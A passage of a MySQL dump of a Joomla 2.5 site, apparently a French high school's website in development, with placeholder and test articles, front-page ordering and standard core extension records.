(56, 97, 'Notre force, nos résultats', 'resultats', '', '<p>nee</p>', '', -2, 0, 0, 7, '2014-01-05 23:53:56', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2014-01-05 23:53:56', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 160, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(57, 99, 'Lorem Ipsum', 'loremipsum', '', '<p><span style="color: #000000; font-family: ''Open Sans'', Arial, sans-serif; font-size: 14px; line-height: 20px; text-align: justify;">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</span></p>', '', -2, 0, 0, 16, '2016-06-08 13:53:16', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-08 13:53:16', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 2, '', '', 1, 4, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(58, 100, 'Bidule', 'bidule', '', '<p><span style="color: #000000; font-family: ''Open Sans'', Arial, sans-serif; font-size: 14px; line-height: 20px; text-align: justify;">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</span></p>', '', -2, 0, 0, 16, '2016-06-08 14:25:11', 390, '', '2016-06-15 14:30:05', 390, 0, '0000-00-00 00:00:00', '2016-06-08 14:25:11', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 1, '', '', 1, 1, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(59, 101, '&nbsp', 'article-test', '', '<p>&amp;nbsp</p>', '', -2, 0, 0, 16, '2016-06-15 14:22:15', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-15 14:22:15', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(60, 105, 'Déscription du lycée', 'art-lycee-description', '', '<p><span style="color: #000000; font-family: ''Open Sans'', Arial, sans-serif; font-size: 14px; line-height: 20px; text-align: justify;">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</span></p>\r\n', '\r\n<p><span style="color: #000000; font-family: ''Open Sans'', Arial, sans-serif; font-size: 14px; line-height: 20px; text-align: justify;">Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?</span></p>', 1, 0, 0, 17, '2016-06-16 10:12:46', 390, '', '2016-06-20 11:25:53', 390, 0, '0000-00-00 00:00:00', '2016-06-16 10:12:46', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 6, 0, 2, '', '', 1, 5, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(61, 106, 'Formations', 'art-formation-formations', '', '<p>Intro formations</p>\r\n<p>{loadmodule mod_custom,mod_custom51}</p>', '', 1, 0, 0, 18, '2016-06-16 10:19:14', 390, '', '2016-06-20 13:15:36', 390, 0, '0000-00-00 00:00:00', '2016-06-16 10:19:14', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 12, 0, 0, '', '', 1, 61, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', '');
INSERT INTO `jos_content` (`id`, `asset_id`, `title`, `alias`, `title_alias`, `introtext`, `fulltext`, `state`, `sectionid`, `mask`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`, `parentid`, `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`, `featured`, `language`, `xreference`) VALUES
(62, 107, 'Dernières actualités', 'art-actualites-dernactus', '', '<p>Toutes dernières actus</p>', '', 1, 0, 0, 19, '2016-06-16 10:20:23', 390, '', '2016-06-20 11:25:39', 390, 0, '0000-00-00 00:00:00', '2016-06-16 10:20:23', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 4, 0, 3, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(63, 109, 'Test article posté', 'testtesttest', '', '<p>hrsojbo oitjhorshj jh osjo ohjdrojhr mhjmihjmrs</p>', '', 1, 0, 0, 21, '2016-06-16 11:46:18', 0, '', '2016-06-16 13:54:20', 390, 0, '0000-00-00 00:00:00', '2016-06-16 13:54:20', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 2, '', '', 1, 6, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(64, 110, 'dgbjsfmlhjm', 'jtdkrjh', '', '<p>rjntd rhrjr rytdjdtj ryj r yr</p>', '', -2, 0, 0, 19, '2016-06-16 11:55:10', 0, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', '', 1, 0, 1, '', '', 1, 0, '', 0, '*', ''),
(65, 111, 'fhndfh', 'rsjghdfj', '', '<p>dbsfhset rh</p>\r\n<p> rtsh trs</p>\r\n<p> srhsr th </p>\r\n', '\r\n<p> </p>\r\n<p>rd rd hrh rd</p>\r\n<p>rs hrdhrd</p>\r\n<p> </p>\r\n<p>r rd jdrjy </p>', -2, 0, 0, 19, '2016-06-16 11:56:42', 0, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', '', 1, 0, 0, '', '', 1, 1, '', 0, '*', ''),
(66, 113, 'Les Points Forts', 'art-lycee-points-forts', '', '<p><span style="color: #000000; font-family: ''Open Sans'', Arial, sans-serif; font-size: 14px; line-height: 20px; text-align: justify;">At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat.</span></p>', '', 1, 0, 0, 17, '2016-06-17 08:37:56', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-17 08:37:56', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 1, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(67, 114, 'Résultats', 'art-lycee-resultats', '', '<p><span style="color: #000000; font-family: ''Open Sans'', Arial, sans-serif; font-size: 14px; line-height: 20px; text-align: justify;">Cras sed diam lacus. Aenean aliquet, massa vitae varius eleifend, lacus metus egestas metus, at scelerisque velit lectus ut ligula. Morbi ac massa ipsum. Fusce eget efficitur neque. Suspendisse potenti. Etiam eget condimentum quam. Phasellus posuere eros ac ultrices faucibus. Maecenas sit amet dui malesuada massa hendrerit posuere. Cras pretium sem at congue aliquam. Maecenas condimentum urna ut sapien accumsan, malesuada volutpat turpis tincidunt. Proin commodo vitae magna eu posuere.</span></p>', '', 1, 0, 0, 17, '2016-06-17 08:51:14', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-17 08:51:14', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(68, 120, 'Test bts 1', 'test-bts', '', '<p>test 1</p>', '', 1, 0, 0, 24, '2016-06-20 10:58:23', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-20 10:58:23', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 1, '', '', 1, 12, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(69, 121, 'Test bts 2', 'test-bts2', '', '<p>test 2</p>', '', 1, 0, 0, 24, '2016-06-20 10:58:52', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-20 10:58:52', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 2, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(70, 122, 'Test prépa 1', 'test-prepa', '', '<p>test 3</p>', '', 1, 0, 0, 25, '2016-06-20 10:59:24', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-20 10:59:24', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 1, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', ''),
(71, 123, 'Test prépa 2', 'test-prepa2', '', '<p>test 4</p>', '', 1, 0, 0, 25, '2016-06-20 10:59:56', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-20 10:59:56', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 1, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(72, 124, 'Test autres', 'test-autres', '', '<p>test 5</p>', '', 1, 0, 0, 21, '2016-06-20 11:00:29', 390, '', '2016-06-21 14:16:59', 390, 0, '0000-00-00 00:00:00', '2016-06-20 11:00:29', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 2, 0, 0, '', '', 1, 3, '{"robots":"","author":"","rights":"","xreference":""}', 1, '*', ''),
(73, 148, 'Test natation 1', 'test-nat1', '', '<p>Test natation 1</p>', '', 1, 0, 0, 42, '2016-06-22 12:56:09', 390, '', '0000-00-00 00:00:00', 0, 0, '0000-00-00 00:00:00', '2016-06-22 12:56:09', '0000-00-00 00:00:00', '', '', '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 1, 0, 0, '', '', 1, 0, '{"robots":"","author":"","rights":"","xreference":""}', 0, '*', '');

-- --------------------------------------------------------

--
-- Table structure for table `jos_content_frontpage`
--

CREATE TABLE IF NOT EXISTS `jos_content_frontpage` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`content_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jos_content_frontpage`
--

INSERT INTO `jos_content_frontpage` (`content_id`, `ordering`) VALUES
(8, 10),
(7, 9),
(6, 8),
(60, 7),
(62, 6),
(61, 5),
(63, 4),
(68, 3),
(71, 2),
(72, 1);

-- --------------------------------------------------------

--
-- Table structure for table `jos_content_rating`
--

CREATE TABLE IF NOT EXISTS `jos_content_rating` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `rating_sum` int(10) unsigned NOT NULL DEFAULT '0',
  `rating_count` int(10) unsigned NOT NULL DEFAULT '0',
  `lastip` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`content_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_core_log_searches`
--

CREATE TABLE IF NOT EXISTS `jos_core_log_searches` (
  `search_term` varchar(128) NOT NULL DEFAULT '',
  `hits` int(10) unsigned NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_extensions`
--

CREATE TABLE IF NOT EXISTS `jos_extensions` (
  `extension_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `type` varchar(20) NOT NULL,
  `element` varchar(100) NOT NULL,
  `folder` varchar(100) NOT NULL,
  `client_id` tinyint(3) NOT NULL,
  `enabled` tinyint(3) NOT NULL DEFAULT '1',
  `access` int(10) unsigned DEFAULT NULL,
  `protected` tinyint(3) NOT NULL DEFAULT '0',
  `manifest_cache` text NOT NULL,
  `params` text NOT NULL,
  `custom_data` text NOT NULL,
  `system_data` text NOT NULL,
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) DEFAULT '0',
  `state` int(11) DEFAULT '0',
  PRIMARY KEY (`extension_id`),
  KEY `element_clientid` (`element`,`client_id`),
  KEY `element_folder_clientid` (`element`,`folder`,`client_id`),
  KEY `extension` (`type`,`element`,`folder`,`client_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10011 ;

--
-- Dumping data for table `jos_extensions`
--

INSERT INTO `jos_extensions` (`extension_id`, `name`, `type`, `element`, `folder`, `client_id`, `enabled`, `access`, `protected`, `manifest_cache`, `params`, `custom_data`, `system_data`, `checked_out`, `checked_out_time`, `ordering`, `state`) VALUES
(1, 'com_mailto', 'component', 'com_mailto', '', 0, 1, 1, 1, '{"legacy":false,"name":"com_mailto","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_MAILTO_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(2, 'com_wrapper', 'component', 'com_wrapper', '', 0, 1, 1, 1, '{"legacy":false,"name":"com_wrapper","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_WRAPPER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(3, 'com_admin', 'component', 'com_admin', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_admin","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_ADMIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(4, 'com_banners', 'component', 'com_banners', '', 1, 1, 1, 0, '{"legacy":false,"name":"com_banners","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_BANNERS_XML_DESCRIPTION","group":""}', '{"purchase_type":"3","track_impressions":"0","track_clicks":"0","metakey_prefix":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(5, 'com_cache', 'component', 'com_cache', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_cache","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CACHE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(6, 'com_categories', 'component', 'com_categories', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_categories","type":"component","creationDate":"December 2007","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CATEGORIES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(7, 'com_checkin', 'component', 'com_checkin', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_checkin","type":"component","creationDate":"Unknown","author":"Joomla! Project","copyright":"(C) 2005 - 2008 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CHECKIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(8, 'com_contact', 'component', 'com_contact', '', 1, 1, 1, 0, '{"legacy":false,"name":"com_contact","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CONTACT_XML_DESCRIPTION","group":""}', '{"show_contact_category":"hide","show_contact_list":"0","presentation_style":"sliders","show_name":"1","show_position":"1","show_email":"0","show_street_address":"1","show_suburb":"1","show_state":"1","show_postcode":"1","show_country":"1","show_telephone":"1","show_mobile":"1","show_fax":"1","show_webpage":"1","show_misc":"1","show_image":"1","image":"","allow_vcard":"0","show_articles":"0","show_profile":"0","show_links":"0","linka_name":"","linkb_name":"","linkc_name":"","linkd_name":"","linke_name":"","contact_icons":"0","icon_address":"","icon_email":"","icon_telephone":"","icon_mobile":"","icon_fax":"","icon_misc":"","show_headings":"1","show_position_headings":"1","show_email_headings":"0","show_telephone_headings":"1","show_mobile_headings":"0","show_fax_headings":"0","allow_vcard_headings":"0","show_suburb_headings":"1","show_state_headings":"1","show_country_headings":"1","show_email_form":"1","show_email_copy":"1","banned_email":"","banned_subject":"","banned_text":"","validate_session":"1","custom_reply":"0","redirect":"","show_category_crumb":"0","metakey":"","metadesc":"","robots":"","author":"","rights":"","xreference":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(9, 'com_cpanel', 'component', 'com_cpanel', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_cpanel","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CPANEL_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10, 'com_installer', 'component', 'com_installer', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_installer","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_INSTALLER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(11, 'com_languages', 'component', 'com_languages', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_languages","type":"component","creationDate":"2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_LANGUAGES_XML_DESCRIPTION","group":""}', '{"administrator":"fr-FR","site":"fr-FR"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(12, 'com_login', 'component', 'com_login', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_login","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_LOGIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(13, 'com_media', 'component', 'com_media', '', 1, 1, 0, 1, '{"legacy":false,"name":"com_media","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_MEDIA_XML_DESCRIPTION","group":""}', '{"upload_extensions":"bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS","upload_maxsize":"10","file_path":"files","image_path":"files\\/images","restrict_uploads":"1","check_mime":"1","image_extensions":"bmp,gif,jpg,png","ignore_extensions":"","upload_mime":"image\\/jpeg,image\\/gif,image\\/png,image\\/bmp,application\\/x-shockwave-flash,application\\/msword,application\\/excel,application\\/pdf,application\\/powerpoint,text\\/plain,application\\/x-zip","upload_mime_illegal":"text\\/html"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(14, 'com_menus', 'component', 'com_menus', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_menus","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_MENUS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(15, 'com_messages', 'component', 'com_messages', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_messages","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_MESSAGES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(16, 'com_modules', 'component', 'com_modules', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_modules","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_MODULES_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
